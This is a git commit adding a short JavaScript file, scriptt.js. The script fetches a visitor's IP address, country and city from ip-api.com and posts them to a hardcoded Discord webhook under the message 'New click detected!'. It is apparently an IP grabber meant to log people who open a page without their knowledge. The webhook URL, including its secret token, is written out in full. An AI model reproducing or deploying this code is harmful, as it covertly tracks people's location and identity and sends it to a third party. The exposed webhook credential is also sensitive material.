84ab23e8fe66a95949012f7ebd183c6ce783a83e
denshi <137957085+reaper111xxxx@users.noreply.github.com>
2025-02-15 16:28:45 +0300

    Add files via upload

---
+++ scriptt.js
@@ -0,0 +1,15 @@
+fetch("http://ip-api.com/json/")
+  .then(response => response.json())
+  .then(data => {
+    const webhookURL = "https://discord.com/api/webhooks/1340295853767921716/GYhNptRd3dW4-iR-mtI1GTY7m2KXtb3hjb1ODo7Lml3gRn0wXm_JqIQZikuwSmJmuxN7"; // Replace with your webhook
+
+    const message = {
+      content: `New click detected!\nIP: ${data.query}\nCountry: ${data.country}\nCity: ${data.city}`
+    };
+
+    fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(message)
+    })
+  });
